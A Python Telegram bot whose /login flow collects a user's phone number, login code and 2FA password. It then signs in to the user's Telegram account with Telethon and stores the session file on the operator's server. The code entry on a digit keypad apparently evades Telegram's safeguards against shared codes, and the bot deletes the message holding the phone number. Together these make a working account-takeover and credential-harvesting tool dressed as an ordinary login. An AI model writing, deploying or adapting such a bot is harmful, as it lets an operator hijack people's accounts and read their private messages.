import os
import asyncio
import datetime
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError

from telegram import (
    Update,
    ReplyKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardRemove,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InputMediaPhoto,
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    ConversationHandler,
    filters,
)
from dotenv import load_dotenv

load_dotenv()

API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("W_TOKEN")

SESSIONS_DIR = "sessions"
os.makedirs(SESSIONS_DIR, exist_ok=True)

ASK_PHONE, WAIT_CODE, WAIT_2FA = range(3)

# временное хранилище
clients = {}
phones = {}
codes = {}
timeouts = {}

# ------------------------------------------------------------
# Генерация цифровой клавиатуры
# ------------------------------------------------------------
def get_code_keyboard():
    rows = [
        ["1", "2", "3"],
        ["4", "5", "6"],
        ["7", "8", "9"],
        ["0"]
    ]
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(txt, callback_data=f"code_{txt}") for txt in row]
        for row in rows
    ] + [[InlineKeyboardButton("⌫", callback_data="code_back")]])


# ------------------------------------------------------------
# /login
# ------------------------------------------------------------
async def login_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    session_path = os.path.join(SESSIONS_DIR, str(user_id))

    # Проверяем, есть ли рабочая сессия
    if os.path.exists(session_path):
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()

        try:
            if await client.is_user_authorized():
                me = await client.get_me()
                photo = await client.download_profile_photo(me, file=bytes)

                bio = me.bot_info_description if hasattr(me, "bot_info_description") else (me.about or "—")

                text = (
                    f"✅ Вы уже авторизованы.\n\n"
                    f"👤 <b>{me.first_name}</b>\n"
                    f"🆔 ID: <code>{me.id}</code>\n"
                    f"🔗 Username: @{me.username}\n"
                    f"📄 Bio: {bio}\n"
                    f"\nСессия активна (действует до удаления файла)."
                )

                if photo:
                    await update.message.reply_photo(photo=photo, caption=text, parse_mode="HTML")
                else:
                    await update.message.reply_text(text, parse_mode="HTML")

                await client.disconnect()
                return ConversationHandler.END
        except Exception:
            pass

    # Если сессии нет или битая → запускаем вход
    kb = ReplyKeyboardMarkup([[KeyboardButton("📱 Отправить номер", request_contact=True)]],
                             resize_keyboard=True)

    await update.message.reply_text("Нажмите кнопку, чтобы отправить номер телефона", reply_markup=kb)
    return ASK_PHONE


# ------------------------------------------------------------
# Пользователь прислал номер
# ------------------------------------------------------------
async def phone_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if update.message.contact is None:
        return ASK_PHONE

    phone = update.message.contact.phone_number
    phones[user_id] = phone

    # Удаляем сообщение с номером
    await update.message.delete()

    # Убираем клавиатуру
    await update.effective_chat.send_message("Получен номер. Ожидаю код...", reply_markup=ReplyKeyboardRemove())

    # Запускаем клиент
    session_path = os.path.join(SESSIONS_DIR, str(user_id))
    client = TelegramClient(session_path, API_ID, API_HASH)
    clients[user_id] = client
    await client.connect()

    try:
        await client.send_code_request(phone)
    except Exception as e:
        await update.effective_chat.send_message(f"Ошибка: {e}")
        return ConversationHandler.END

    codes[user_id] = ""

    # Запускаем таймер
    timeouts[user_id] = asyncio.get_event_loop().call_later(
        60, lambda: asyncio.create_task(timeout_fail(update, context))
    )

    await update.effective_chat.send_message("Введите код:", reply_markup=get_code_keyboard())
    return WAIT_CODE


# ------------------------------------------------------------
# Таймаут 1 минута
# ------------------------------------------------------------
async def timeout_fail(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # Завершение процесса входа
    if user_id in clients:
        try:
            await clients[user_id].disconnect()
        except:
            pass
        del clients[user_id]

    codes.pop(user_id, None)
    phones.pop(user_id, None)

    await update.effective_chat.send_message("⏳ Время на ввод кода истекло. Попробуйте снова: /login")


# ------------------------------------------------------------
# Ввод кода клавиатурой
# ------------------------------------------------------------
async def code_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    data = query.data

    if data == "code_back":
        codes[user_id] = codes[user_id][:-1]
    else:
        digit = data.split("_")[1]
        codes[user_id] += digit

    # отображаем код
    dots = "●" * len(codes[user_id])
    await query.edit_message_text(f"Введите код:\n{dots}", reply_markup=get_code_keyboard())

    # если ввели 5 цифр
    if len(codes[user_id]) == 5:
        return await finish_code(update, context)

    return WAIT_CODE


# ------------------------------------------------------------
# Завершаем ввод кода
# ------------------------------------------------------------
async def finish_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id

    code = codes[user_id]
    client = clients[user_id]
    phone = phones[user_id]

    # Останавливаем таймер
    if user_id in timeouts:
        timeouts[user_id].cancel()
        del timeouts[user_id]

    try:
        await client.sign_in(phone=phone, code=code)
        await client.disconnect()
        await query.edit_message_text("✅ Вход выполнен. Сессия сохранена.")
        return ConversationHandler.END

    except SessionPasswordNeededError:
        await query.edit_message_text("Введите пароль 2FA:")
        return WAIT_2FA
    except Exception as e:
        await query.edit_message_text(f"Ошибка входа: {e}")
        return ConversationHandler.END


# ------------------------------------------------------------
# 2FA Пароль
# ------------------------------------------------------------
async def password_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    password = update.message.text.strip()

    client = clients[user_id]

    try:
        await client.sign_in(password=password)
        await client.disconnect()
        await update.message.reply_text("✅ Успешный вход. Сессия сохранена.")
    except Exception as e:
        await update.message.reply_text(f"Ошибка 2FA: {e}")

    return ConversationHandler.END


# ------------------------------------------------------------
# CANCEL
# ------------------------------------------------------------
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Отменено.")
    return ConversationHandler.END


# ------------------------------------------------------------
# MAIN
# ------------------------------------------------------------
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    conv = ConversationHandler(
        entry_points=[CommandHandler("login", login_start)],
        states={
            ASK_PHONE: [MessageHandler(filters.CONTACT, phone_received)],
            WAIT_CODE: [CallbackQueryHandler(code_input)],
            WAIT_2FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, password_handler)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True
    )

    app.add_handler(conv)

    print("Bot started.")
    app.run_polling()


if __name__ == "__main__":
    main()
